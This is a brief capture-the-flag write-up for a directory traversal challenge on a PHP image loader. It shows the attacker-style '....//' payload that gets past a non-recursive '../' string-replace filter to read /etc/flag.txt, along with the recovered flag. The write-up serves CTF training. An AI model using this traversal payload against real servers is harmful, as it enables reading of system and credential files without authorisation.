# Directory traversal

Please give me the flag located at /etc/flag.txt

The web application is available [here](https://nm02.bootupctf.net:8082/)

# Writeup

This website has a lot of images which are loaded via a PHP file 

```
https://nm02.bootupctf.net:8082/picture.php?image=1.jpg
```

Guessing this file is used, changing `1.jpg` with `../../../../etc/flag.txt` but did not get anything. Then tried `....//` which seems to work. Guessing they do a string replace for `../` as a protection measurement.

```
https://nm02.bootupctf.net:8082/picture.php?image=....//....//....//....//....//etc/flag.txt
```

There we got a flag!

```
mne{so_much_for_that_filter}
```

